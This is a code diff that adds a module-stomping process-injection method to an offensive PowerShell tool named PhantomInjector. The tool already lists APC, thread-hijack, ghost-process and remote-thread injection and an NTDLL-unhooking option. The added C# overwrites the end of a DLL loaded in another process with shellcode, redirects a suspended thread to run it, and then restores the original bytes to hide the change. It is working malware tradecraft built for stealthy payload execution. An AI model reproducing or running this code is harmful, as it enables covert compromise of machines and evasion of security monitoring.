@@ -423,6 +423,452 @@ public class APCInjector {
     }
 }
 
+function Invoke-ModuleStompingInjection {
+    param(
+        [byte[]]$Shellcode,
+        [string]$ProcessName,
+        [int]$ProcessId,
+        [int]$TimeoutMS = 2000
+    )
+
+    $stompingCode = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+using System.Collections.Generic;
+using System.Text;
+
+public class ModuleStomper {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct MODULEINFO {
+        public IntPtr lpBaseOfDll;
+        public uint SizeOfImage;
+        public IntPtr EntryPoint;
+    }
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr OpenProcess(
+        uint dwDesiredAccess,
+        bool bInheritHandle,
+        uint dwProcessId);
+
+    [DllImport("psapi.dll", SetLastError=true)]
+    public static extern bool EnumProcessModules(
+        IntPtr hProcess,
+        [Out] IntPtr[] lphModule,
+        uint cb,
+        out uint lpcbNeeded);
+
+    [DllImport("psapi.dll", CharSet=CharSet.Auto)]
+    public static extern uint GetModuleFileNameEx(
+        IntPtr hProcess,
+        IntPtr hModule,
+        StringBuilder lpFilename,
+        uint nSize);
+
+    [DllImport("psapi.dll", SetLastError=true)]
+    public static extern bool GetModuleInformation(
+        IntPtr hProcess,
+        IntPtr hModule,
+        out MODULEINFO lpmodinfo,
+        uint cb);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool VirtualProtectEx(
+        IntPtr hProcess,
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        uint nSize,
+        out UIntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool ReadProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        uint nSize,
+        out UIntPtr lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr OpenThread(
+        uint dwDesiredAccess,
+        bool bInheritHandle,
+        uint dwThreadId);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint SuspendThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    public static extern uint NtGetContextThread(
+        IntPtr ThreadHandle,
+        IntPtr Context);
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    public static extern uint NtSetContextThread(
+        IntPtr ThreadHandle,
+        IntPtr Context);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool GetExitCodeProcess(
+        IntPtr hProcess,
+        out uint lpExitCode);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT_X64 {
+        public ulong P1Home;
+        public ulong P2Home;
+        public ulong P3Home;
+        public ulong P4Home;
+        public ulong P5Home;
+        public ulong P6Home;
+        public uint ContextFlags;
+        public uint MxCsr;
+        public ushort SegCs;
+        public ushort SegDs;
+        public ushort SegEs;
+        public ushort SegFs;
+        public ushort SegGs;
+        public ushort SegSs;
+        public uint EFlags;
+        public ulong Dr0;
+        public ulong Dr1;
+        public ulong Dr2;
+        public ulong Dr3;
+        public ulong Dr6;
+        public ulong Dr7;
+        public ulong Rax;
+        public ulong Rcx;
+        public ulong Rdx;
+        public ulong Rbx;
+        public ulong Rsp;
+        public ulong Rbp;
+        public ulong Rsi;
+        public ulong Rdi;
+        public ulong R8;
+        public ulong R9;
+        public ulong R10;
+        public ulong R11;
+        public ulong R12;
+        public ulong R13;
+        public ulong R14;
+        public ulong R15;
+        public ulong Rip;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT_X86 {
+        public uint ContextFlags;
+        public uint Dr0;
+        public uint Dr1;
+        public uint Dr2;
+        public uint Dr3;
+        public uint Dr6;
+        public uint Dr7;
+        public uint FloatSave;
+        public uint SegGs;
+        public uint SegFs;
+        public uint SegEs;
+        public uint SegDs;
+        public uint Edi;
+        public uint Esi;
+        public uint Ebx;
+        public uint Edx;
+        public uint Ecx;
+        public uint Eax;
+        public uint Ebp;
+        public uint Eip;
+        public uint SegCs;
+        public uint EFlags;
+        public uint Esp;
+        public uint SegSs;
+    }
+
+    public static bool Inject(int processId, byte[] shellcode, int timeoutMS) {
+        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+        const uint THREAD_ALL_ACCESS = 0x001F03FF;
+        const uint PAGE_READWRITE = 0x04;
+        const uint PAGE_EXECUTE_READ = 0x20;
+        const uint STILL_ACTIVE = 0x103;
+        const uint CONTEXT_FULL = 0x10007;
+
+        IntPtr hProcess = IntPtr.Zero;
+        byte[] originalBytes = null;
+        IntPtr targetAddress = IntPtr.Zero;
+        uint originalProtection = 0;
+        uint exitCode = STILL_ACTIVE;
+        UIntPtr bytesWrittenDummy;
+        UIntPtr bytesReadDummy;
+
+        try {
+            // 1. Open target process
+            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);
+            if (hProcess == IntPtr.Zero) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess failed");
+            }
+
+            // 2. Find suitable module for stomping
+            IntPtr targetModule = FindSuitableModule(hProcess, shellcode.Length);
+            if (targetModule == IntPtr.Zero) {
+                throw new Exception("No suitable module found for stomping");
+            }
+
+            // 3. Get module information
+            MODULEINFO moduleInfo;
+            if (!GetModuleInformation(hProcess, targetModule, out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO)))) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "GetModuleInformation failed");
+            }
+
+            // 4. Calculate safe injection point at end of module
+            targetAddress = new IntPtr(moduleInfo.lpBaseOfDll.ToInt64() + moduleInfo.SizeOfImage - shellcode.Length);
+            if (targetAddress.ToInt64() < moduleInfo.lpBaseOfDll.ToInt64()) {
+                throw new Exception("Shellcode too large for module");
+            }
+
+            // 5. Backup original module bytes
+            originalBytes = new byte[shellcode.Length];
+            if (!ReadProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesReadDummy)) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "ReadProcessMemory failed");
+            }
+
+            // 6. Change protection to RW
+            if (!VirtualProtectEx(hProcess, targetAddress, (uint)shellcode.Length, PAGE_READWRITE, out originalProtection)) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualProtectEx failed");
+            }
+
+            // 7. Write shellcode
+            if (!WriteProcessMemory(hProcess, targetAddress, shellcode, (uint)shellcode.Length, out bytesWrittenDummy)) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");
+            }
+
+            // 8. Restore original protection
+            uint dummyProtect;
+            if (!VirtualProtectEx(hProcess, targetAddress, (uint)shellcode.Length, PAGE_EXECUTE_READ, out dummyProtect)) {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualProtectEx restore failed");
+            }
+
+            // 9. Get process threads
+            var process = Process.GetProcessById(processId);
+            if (process.Threads.Count == 0) {
+                throw new Exception("No threads found in target process");
+            }
+
+            // 10. Try to hijack a thread
+            bool threadHijacked = false;
+            foreach (ProcessThread thread in process.Threads) {
+                IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, (uint)thread.Id);
+                if (hThread == IntPtr.Zero) continue;
+
+                try {
+                    if (SuspendThread(hThread) == 0xFFFFFFFF) continue;
+
+                    // Get architecture
+                    bool is64Bit = (IntPtr.Size == 8);
+                    IntPtr contextPtr = IntPtr.Zero;
+                    int contextSize = is64Bit ? Marshal.SizeOf(typeof(CONTEXT_X64)) : Marshal.SizeOf(typeof(CONTEXT_X86));
+                    
+                    try {
+                        contextPtr = Marshal.AllocHGlobal(contextSize);
+                        if (is64Bit) {
+                            var context = new CONTEXT_X64();
+                            context.ContextFlags = CONTEXT_FULL;
+                            Marshal.StructureToPtr(context, contextPtr, false);
+                        } else {
+                            var context = new CONTEXT_X86();
+                            context.ContextFlags = CONTEXT_FULL;
+                            Marshal.StructureToPtr(context, contextPtr, false);
+                        }
+                        
+                        // Use native API for reliability
+                        uint status = NtGetContextThread(hThread, contextPtr);
+                        if (status != 0) continue;
+
+                        // Backup original instruction pointer
+                        IntPtr originalIP = IntPtr.Zero;
+                        if (is64Bit) {
+                            var context = (CONTEXT_X64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X64));
+                            originalIP = new IntPtr((long)context.Rip);
+                            context.Rip = (ulong)targetAddress.ToInt64();
+                            Marshal.StructureToPtr(context, contextPtr, false);
+                        } else {
+                            var context = (CONTEXT_X86)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X86));
+                            originalIP = new IntPtr(context.Eip);
+                            context.Eip = (uint)targetAddress.ToInt32();
+                            Marshal.StructureToPtr(context, contextPtr, false);
+                        }
+
+                        // Set new context
+                        status = NtSetContextThread(hThread, contextPtr);
+                        if (status != 0) continue;
+
+                        // Create restoration thread
+                        System.Threading.ThreadPool.QueueUserWorkItem(state => {
+                            try {
+                                System.Threading.Thread.Sleep(timeoutMS);
+                                
+                                // Check if process still exists
+                                if (!GetExitCodeProcess(hProcess, out exitCode) || exitCode != STILL_ACTIVE) return;
+                                
+                                if (SuspendThread(hThread) != 0xFFFFFFFF) {
+                                    // Restore original memory
+                                    uint tempProt;
+                                    VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, PAGE_READWRITE, out tempProt);
+                                    WriteProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesWrittenDummy);
+                                    VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, originalProtection, out tempProt);
+                                    
+                                    // Restore original context
+                                    if (is64Bit) {
+                                        var context = (CONTEXT_X64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X64));
+                                        context.Rip = (ulong)originalIP.ToInt64();
+                                        Marshal.StructureToPtr(context, contextPtr, false);
+                                        NtSetContextThread(hThread, contextPtr);
+                                    } else {
+                                        var context = (CONTEXT_X86)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X86));
+                                        context.Eip = (uint)originalIP.ToInt32();
+                                        Marshal.StructureToPtr(context, contextPtr, false);
+                                        NtSetContextThread(hThread, contextPtr);
+                                    }
+                                    
+                                    ResumeThread(hThread);
+                                }
+                            }
+                            catch { /* Suppress errors during cleanup */ }
+                            finally {
+                                CloseHandle(hThread);
+                            }
+                        });
+
+                        ResumeThread(hThread);
+                        threadHijacked = true;
+                        break;
+                    }
+                    finally {
+                        if (contextPtr != IntPtr.Zero) 
+                            Marshal.FreeHGlobal(contextPtr);
+                    }
+                }
+                catch {
+                    // Ensure thread is resumed on error
+                    ResumeThread(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+
+            if (!threadHijacked) {
+                throw new Exception("Failed to hijack any thread");
+            }
+
+            return true;
+        }
+        catch (Exception ex) {
+            // Emergency restoration if process is still alive
+            if (hProcess != IntPtr.Zero && GetExitCodeProcess(hProcess, out exitCode) && exitCode == STILL_ACTIVE) {
+                try {
+                    if (originalBytes != null && targetAddress != IntPtr.Zero) {
+                        uint tempProt;
+                        VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, PAGE_READWRITE, out tempProt);
+                        WriteProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesWrittenDummy);
+                        VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, originalProtection, out tempProt);
+                    }
+                } catch {}
+            }
+            throw new Exception("Injection failed: " + ex.Message);
+        }
+        finally {
+            if (hProcess != IntPtr.Zero) 
+                CloseHandle(hProcess);
+        }
+    }
+
+    private static IntPtr FindSuitableModule(IntPtr hProcess, int minSize) {
+        IntPtr[] moduleHandles = new IntPtr[1024];
+        uint cbNeeded;
+        if (!EnumProcessModules(hProcess, moduleHandles, (uint)(moduleHandles.Length * IntPtr.Size), out cbNeeded)) {
+            return IntPtr.Zero;
+        }
+
+        int moduleCount = (int)(cbNeeded / IntPtr.Size);
+        string[] excludedModules = { 
+            "ntdll.dll", "kernel32.dll", "kernelbase.dll", 
+            "mscoree.dll", "KERNELBASE.dll", "msvcrt.dll",
+            "user32.dll", "gdi32.dll", "combase.dll",
+            "advapi32.dll", "sechost.dll", "rpcrt4.dll"
+        };
+
+        for (int i = 0; i < moduleCount; i++) {
+            var moduleName = new StringBuilder(260);
+            if (GetModuleFileNameEx(hProcess, moduleHandles[i], moduleName, (uint)moduleName.Capacity) == 0) {
+                continue;
+            }
+
+            string fileName = System.IO.Path.GetFileName(moduleName.ToString()).ToLower();
+            bool isExcluded = false;
+            foreach (string excluded in excludedModules) {
+                if (fileName == excluded.ToLower()) {
+                    isExcluded = true;
+                    break;
+                }
+            }
+
+            if (isExcluded) continue;
+
+            MODULEINFO moduleInfo;
+            if (!GetModuleInformation(hProcess, moduleHandles[i], out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO)))) {
+                continue;
+            }
+
+            // Ensure module is large enough and has space at the end
+            if (moduleInfo.SizeOfImage > minSize && moduleInfo.SizeOfImage > 4096) {
+                return moduleHandles[i];
+            }
+        }
+
+        return IntPtr.Zero;
+    }
+}
+"@
+
+    try {
+        Add-Type -TypeDefinition $stompingCode -ErrorAction Stop
+        
+        if ($ProcessId -eq 0) {
+            $targetProcess = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
+            $ProcessId = $targetProcess.Id
+        }
+
+        Write-Verbose "Attempting module stomping injection on PID: $ProcessId with ${TimeoutMS}ms timeout"
+        
+        $result = [ModuleStomper]::Inject($ProcessId, $Shellcode, $TimeoutMS)
+        
+        if ($result) {
+            Write-Verbose "[+] Module stomping injection completed"
+            return $true
+        } else {
+            Write-Warning "[-] Module stomping injection failed"
+            return $false
+        }
+    }
+    catch {
+        Write-Warning "[-] Module stomping error: $_"
+        return $false
+    }
+}
+
+
 function Invoke-ThreadHijack {
     param(
         [byte[]]$Shellcode,
@@ -1471,7 +1917,7 @@ function Invoke-PhantomInjector {
         [ValidateRange(0, [int]::MaxValue)]
         [int]$ProcessId = 0,
 
-        [ValidateSet('APC','ThreadHijack','GhostProcess','RemoteThread')]
+        [ValidateSet('APC','ThreadHijack','GhostProcess','RemoteThread','ModuleStomping')]
         [string]$InjectionMethod = 'APC',
 
         [switch]$UnhookNTDLL,
@@ -1514,6 +1960,9 @@ function Invoke-PhantomInjector {
         'RemoteThread' {
             $success = Invoke-RemoteThreadInjection -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
         }
+		'ModuleStomping' {
+			$success = Invoke-ModuleStompingInjection -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
+		}
         default {
             Write-Warning "[-] Invalid injection method specified"
             return
